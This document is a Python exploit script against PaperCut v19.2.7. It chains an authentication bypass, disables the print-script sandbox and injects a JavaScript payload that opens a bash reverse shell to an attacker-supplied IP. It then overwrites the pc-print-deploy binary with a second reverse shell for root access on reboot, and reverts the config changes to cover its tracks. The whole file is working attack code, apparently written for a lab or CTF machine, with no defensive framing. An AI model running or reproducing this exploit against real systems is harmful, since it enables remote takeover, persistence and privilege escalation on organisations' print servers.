import requests
import argparse
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def pwn_papercut(target, kali_ip):
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    })
    base_url = f"http://{target}:9191"
    
    print(f"[*] Targeting PaperCut v19.2.7 at: {base_url}")
    
    # Auth bypass
    s.get(f"{base_url}/app?service=page/SetupCompleted", verify=False)
    data = {
        'service': 'direct/1/SetupCompleted/$Form', 'sp': 'S0',
        'Form0': '$Hidden,analyticsEnabled,$Submit', '$Hidden': 'true', '$Submit': 'Login'
    }
    s.post(f"{base_url}/app", data=data, verify=False)
    
    if 'JSESSIONID' not in s.cookies.get_dict():
        print("[-] Auth bypass failed.")
        return
    print("[+] Auth bypass successful!")

    # Disable sandbox & enable scripting 
    for setting, value in [('print-and-device.script.enabled', 'Y'), ('print.script.sandboxed', 'N')]:
        print(f"[*] Updating config: {setting} -> {value}")
        headers = {'Origin': f'{base_url}'}
        s.post(f"{base_url}/app", data={
            'service': 'direct/1/ConfigEditor/quickFindForm', 
            'sp': 'S0',
            'Form0': '$TextField,doQuickFind,clear', 
            '$TextField': setting, 
            'doQuickFind': 'Go'
        }, headers=headers, verify=False)
        
        s.post(f"{base_url}/app", data={
            'service': 'direct/1/ConfigEditor/$Form', 'sp': 'S1',
            'Form1': '$TextField$0,$Submit,$Submit$0', 
            '$TextField$0': value, 
            '$Submit$0': 'Update'
        }, headers=headers, verify=False)

    # Discovery
    r_list = s.get(f"{base_url}/app?service=page/PrinterList", verify=False)
    all_ids = re.findall(r'selectPrinter&amp;sp=([a-zA-Z0-9]+)', r_list.text)
    printer_id = [pid for pid in all_ids if pid != "l1001"][0]
    print(f"[+] Targeting Printer: {printer_id}")

    # Injection
    s.get(f"{base_url}/app?service=direct/1/PrinterList/selectPrinter&sp={printer_id}", verify=False)
    tab_url = f"{base_url}/app?service=direct/1/PrinterDetails/printerOptionsTab.tab&sp=4"
    s.get(tab_url, verify=False)
    s.headers.update({'Referer': tab_url})

    # Integrated payload (onitial shell + privEsc hyjack)
    js_payload = (
        f'var cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/{kali_ip}/4444 0>&1 & '
        f'mv /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy.bak; '
        f'echo \\"#!/bin/bash\\" > /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy; '
        f'echo \\"bash -i >& /dev/tcp/{kali_ip}/4445 0>&1\\" >> /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy; '
        f'chmod +x /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy"];\r\n'
        f'java.lang.Runtime.getRuntime().exec(cmd);\r\n\r\n'
        f'function printJobHook(inputs, actions) {{\r\n'
        f'  // Empty\r\n'
        f'}}'
    )

    post_data = {
        'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
        'sp': 'S0',
        'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
        'printerId': printer_id,
        'enablePrintScript': 'on',
        'scriptBody': js_payload,
        '$Submit': 'Apply',
        '$Submit$1': 'Apply'
    }

    r_final = s.post(f"{base_url}/app", data=post_data, verify=False)

    # Revert setting changes
    for setting, value in [('print-and-device.script.enabled', 'N'), ('print.script.sandboxed', 'Y')]:
        print(f"[*] Reverting config: {setting} -> {value}")
        headers = {'Origin': f'{base_url}'}
        s.post(f"{base_url}/app", data={
            'service': 'direct/1/ConfigEditor/quickFindForm', 
            'sp': 'S0',
            'Form0': '$TextField,doQuickFind,clear', 
            '$TextField': setting, 
            'doQuickFind': 'Go'
        }, headers=headers, verify=False)
        
        s.post(f"{base_url}/app", data={
            'service': 'direct/1/ConfigEditor/$Form', 'sp': 'S1',
            'Form1': '$TextField$0,$Submit,$Submit$0', 
            '$TextField$0': value, 
            '$Submit$0': 'Update'
        }, headers=headers, verify=False)

    if "Saved successfully" in r_final.text:
        print("[+] SUCCESS: Exploit chain deployed! Root access will be granted on reboot.")
    elif kali_ip in r_final.text:
        print("[+] SUCCESS: Payload verified in response! Check UI.")
    else:
        print(f"[-] FAILED: Status {r_final.status_code}.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-k", "--kali", required=True)
    args = parser.parse_args()
    pwn_papercut(args.target, args.kali)